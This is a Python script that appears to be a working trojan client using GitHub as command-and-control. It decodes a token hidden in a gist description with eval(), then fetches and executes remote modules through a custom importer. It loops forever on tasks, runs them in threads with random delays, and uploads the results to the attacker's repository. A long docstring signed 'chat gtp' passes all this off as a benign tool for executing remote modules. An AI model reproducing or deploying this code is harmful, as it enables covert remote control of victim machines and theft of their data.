#!/usr/bin/env python3
'''
This is a Python script that uses the GitHub API to retrieve and execute modules from a remote repository. The script has several functions that work together to allow a client to retrieve a list of tasks from a configuration file on the remote repository, execute those tasks, and then update the repository with the results of the executed tasks.

The script begins by importing several libraries, including the base64, importlib, random, json, time, threading, and queue libraries, as well as the GitHub library from the PyGithub module. It then sets several constants, including the GitHub username of the repository owner, the name of the configuration file, and the name of the repository.

The script then defines a function called retrieve_contents(), which takes a file path as an argument and returns the contents of that file from the remote repository. The function uses the PyGithub library to retrieve the branch and tree objects for the repository, and then iterates over the files in the tree to find the file with the specified path. Once it finds the file, it retrieves the contents of the file using the blob object and returns the decoded content.

The script then defines a class called GitImporter, which is used to import modules from the remote repository. The class has two methods: find_module() and load_module(). The find_module() method takes a module name as an argument and attempts to retrieve the contents of that module from the remote repository using the retrieve_contents() function. If the module contents are found, the method decodes the contents and stores them in a class variable called current_module_contents. The method then returns the GitImporter object. The load_module() method takes a module name as an argument and uses the current_module_contents variable to create a module object using the Python importlib library. The method then adds the module object to the sys.modules dictionary and returns the module object.

The script then defines a class called ClientHandler, which is used to handle client requests. The class has several instance variables, including the client ID, the task queue, the configuration file path, and the data file path. The class has several methods, including get_client_config(), which retrieves the client's configuration file from the remote repository and returns a list of tasks; module_queue(), which adds a task to the task queue and executes the specified module; create_client_config(), which creates a new client configuration file on the remote repository; update_client_config(), which updates the client's configuration file on the remote repository; and module_exec(), which executes a specified module and uploads the results to the remote repository.

The script then defines a function called threader(), which takes a function object and a task as arguments and creates a new thread to execute the function with the specified task. The function also adds a random delay before starting the thread to simulate a more realistic workload.

The script then defines the main() function, which sets the sys.meta_path variable to an instance of the GitImporter class and creates a new ClientHandler object. The function then enters an infinite loop, where it retrieves the client's configuration file, iterates over the tasks in the file, and executes each task using the appropriate method of the ClientHandler object.

Overall, this script provides a simple but effective way to execute remote modules on a client system using a remote repository. The use of threads and delays helps to simulate a more realistic workload and avoid overwhelming the client system with too many tasks at once.
-chat gtp
'''


import sys
from base64 import b64decode, b64encode
from importlib import util
from random import randint
from json import loads
from time import time, sleep 
from threading import Thread
from queue import Queue
from datetime import datetime
from github3 import login, GitHub


GIST_USER: str = 'Sharerwe'
GIST_LIST: object = GitHub().gists_by(GIST_USER)
GIST_DESC: str = [gist.as_dict()['description'] for gist in GIST_LIST if 'QRTXWY.txt' in str(gist.as_dict()['files'].keys())][0]
GIT_INFO: dict = eval(b64decode(GIST_DESC))
GIT_LOGIN: object = login(token=GIT_INFO['token']) 
GIT_REPO: object = GIT_LOGIN.repository(GIT_INFO['user'], GIT_INFO['repo'])

def retrieve_contents(file_path: str) -> str(b64encode):
    branch = GIT_REPO.branch('main')
    tree = branch.commit.commit.tree.to_tree().recurse()
    
    for filename in tree.tree:      
        if file_path in filename.path:
            print(f'[+] Found file {file_path}')
            blob = GIT_REPO.blob(filename._json_data['sha'])
            return blob.content


class GitImporter(object):
    def __init__(self) -> None:
        self.current_module_contents: str = ''
    
    def find_module(self, module: str, path=None) -> object:
        print(f'[&] Attempting to retrieve {module}')
        module_contents = retrieve_contents(f'modules/{module}')         
        
        if module_contents:
            self.current_module_contents = b64decode(module_contents)        
            return self

    def load_module(self, name: str) -> object:    
        spec = util.spec_from_loader(name, loader=None, origin=GIT_REPO.git_url)
        module = util.module_from_spec(spec)
        exec(self.current_module_contents, module.__dict__)
        sys.modules[spec.name] = module
        return module

class ClientHandler:

    def __init__(self,) -> None:
        self.client_id: str = None
        self.task_queue: Queue = Queue()
        self.config_path: str = f'config/{self.client_id}.json'
        self.data_path: str = f'data/{self.client_id}'

    def get_client_config(self) -> list(dict()):
        config_json: str(b64encode) = retrieve_contents(self.config_path)
        
        if config_json == None:
            configuration: list(dict()) = [{'module':'stage_1'}]
        
        else:
            configuration: list(dict()) = loads(b64decode(config_json))
        
        for tasks in configuration:
            if tasks['module'] not in sys.modules:
                exec(f"import {tasks['module']}")
        return configuration
         
    def module_queue(self, module: str) -> str:
        self.task_queue.put(1)
        result = sys.modules[module].run()
        self.task_queue.get()
        return result

    def create_client_config(self, module: str) -> None:
        self.client_id = f'ent-{int(time())}'
        self.config_path = f'config/{self.client_id}.json'
        self.data_path = f'data/{self.client_id}'
        result = self.module_queue(module)
        message = f'{self.client_id} init {datetime.now().isoformat()}' 
        bindata = bytes(r'%s' %result, 'utf-8')
        GIT_REPO.create_file(self.config_path, message, bindata)
    
    def update_client_config(self, module: str) -> None:
        result = self.module_queue(module)
        message = f'{self.client_id} update {datetime.now().isoformat()}' 
        bindata = bytes(r'%s' %result, 'utf-8')
        GIT_REPO.file_contents(self.config_path).update(message,bindata)
    
    def module_exec(self, module: str) -> None:
        result = self.module_queue(module)
        message = f'{module}__{datetime.now().isoformat()}'
        data_path_full = f'{self.data_path}/{int(time())}.data'
        bindata = bytes('%r' %result, 'utf-8')
        GIT_REPO.create_file(data_path_full, message, b64encode(bindata))
    
def threader(func: object, task: str) -> None:
    t = Thread(target=func, args=(task, ))
    t.start()
    sleep(randint(10,20))

def main() -> None:
    sys.meta_path = [GitImporter()]
    client: object = ClientHandler()
    module_list: list(str) = [] 
    
    while True:
        if client.task_queue.empty():
            config: list(dict()) = client.get_client_config()
            
            for task in config:
                if task['module'] in module_list and task['module'] != 'sleep':
                    continue
                
                else:
                    module_list.append(task['module'])
                    
                    if task['module'] == 'stage_1':
                        threader(client.create_client_config, task['module'])
                    
                    elif 'qrw' in task['module']:
                        threader(client.update_client_config, task['module'])
                    
                    else:
                        threader(client.module_exec, task['module'])


if __name__=='__main__':
    main()
